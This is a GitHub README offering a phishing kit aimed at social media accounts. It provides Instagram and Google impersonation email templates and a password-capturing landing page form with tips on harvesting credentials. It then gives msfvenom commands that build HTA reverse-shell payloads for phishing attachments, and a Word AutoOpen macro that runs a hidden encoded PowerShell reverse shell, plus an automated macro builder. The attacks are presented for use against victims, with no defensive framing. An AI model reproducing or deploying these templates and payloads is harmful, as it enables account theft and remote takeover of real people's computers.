# Hacking-Social_Media-Accounts
Hacking Social Media Accounts with Phishing Tool (GoPhish) 🐟

### ⚠️ NOTICE: 
**🫵🏼 First time here? huh ( ≖‿  ≖ )🔪**

**Don't forget to hit the star button ⭐️ up there! I keep updating this repo with more phishing-related stuff over time**

***so be sure to show some love!🩸🫶🏽***
<div align="center">

![1](https://media.giphy.com/media/8eteLyVqRlL1AOz7Uz/giphy.gif)
</div>


# gophish-templates
Templates for an open-source Phishing Toolkit
Some very basic configurations and templates to provide clean layouts usable in [GoPhish](https://github.com/gophish/gophish), an open-source phishing toolkit. These layouts provided will also work with any other phising service as well, though they have only been tested in GoPhish.

![GoPhish](https://i.imgur.com/7Jklgjv.png)

## Installation ⚓
Installing the files is easy. Download the GoPhish client and log in at `https://127.0.0.1:3333/` with the standard credentials visible in the command line. There, the various templates and landing pages can be configured with my html configurations. 
 
## Features 🎣
* Instagram Landing Page
* Instagram Mail Template

#### Instagram Landing Page 💈

A very basic Instagram landing page which attempts to have people enter user details.

Link: `https://www.instagram.com/accounts/login/`  
Title: `Login • Instagram`

![instagrampage](https://i.imgur.com/eR5GJoo.png)


#### Instagram Mail Template 💈

A very basic Instagram mail which attempts to have people click on a link to secure their account.

Subject: `New Instagram Login`  
Sender: `security@mail.instagram.com`

![instagrammail](https://i.imgur.com/ILUT94f.png)

#### Google Chrome OS Mail Template 💈

A very basic Google mail, which notifies the user about a login.  

Subject: `New Sign In`  
Sender: `no-reply@accounts.google.com`  

![chromemail](https://i.imgur.com/wx0g4ZC.png)

## Q/A ❓
### Q1 Submitted Form Data Isn't Being Captured (o_O)? 
To capture data submitted through a landing page, you need to create an HTML <form> element on your landing page that has a few specific properties:
Here is a minimal example <form> element which captures data: 

```
<form action="" method="POST">
    <input name="username" type="text" placeholder="username" />
    <input name="password" type="password" placeholder="password" />
    <input type="submit" value="Submit" />
</form>

```
#### There are a few things to note about this form:

* The action is "" so that form submissions are directed to your phishing page and, therefore, to your Gophish server
* The form submission method is POST 
* Each input which you expect to see in Gophish has a name attribute

Each of these should be checked when troubleshooting HTML forms that don't appear to be sending data correctly.
If you still aren't seeing your form submitted correctly, you may need to review and remove any Javascript on the page interfering with the form submission.
Finally, ensure that when saving the landing page that you have both the "Capture Submitted Data" and "Capture Passwords" (if appropriate) options checked. Otherwise, Gophish will remove the name attributes from your inputs so they aren't submitted with the form. 

### Q2  How i setup Phishing Campaing ? ¯\_(ツ)_/¯ 

You can read this article to get more information about how to set up a phishing campaign!
```
https://www.hackercoolmagazine.com/gophish-setup-a-phishing-campaign/
```
# 
#
# How to Compromise Windows 🦋 system

***You can add this payload to your phishing email. When the victim installs & open this malicious file, you'll get your shell 🐚***

## HTA Attack in Action

We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. 
In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.

```
msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
```
## Exploiting Microsoft Windows using MS Word Macro [ Manually ] 🐓
The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.

Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
```
Create the .doc file
Use the base64 powershell code from revshells.com
```
Used this code to inline macro(Paste the code from revshells in str variable) :
```
str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

n = 50

for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"'
```
```
Sub AutoOpen()

  MyMacro

End Sub

Sub Document_Open()

  MyMacro

End Sub

Sub MyMacro()

    Dim Str As String

   <b>Paste the script output here!<b>

    CreateObject("Wscript.Shell").Run Str

End Sub
```
## Exploiting Microsoft Windows using MS Word Macro [Automation Script] 🪿
If the thought of manually crafting a macro exploit seems feels like a headache then This tool simplifies the process, which automatically generate MW word macros which contain's your RCE payload code.

***Minitrue***
```
git clone https://github.com/X0RW3LL/Minitrue.git
```
```
cd /opt/WindowsMacros/Minitrue
./minitrue
select a payload: windows/x64/shell_reverse_tcp
select the payload type: VBA Macro
LHOST=$yourIP
LPORT=$yourPort
Payload encoder: None
Select or enter file name (without extensions): hacker
```


## Disclaimer
The files in this repository were created and modified by me,  for my own personal use and come with no guarantee to work for you. I provide these files "as-is" and offer no support whatsoever to get them working. A lot of these files use terrible formatted and layered tables, anyone working with email and newsletter designs knows how painful they can be, and how worse it is to reverse-engineer those.🦆 



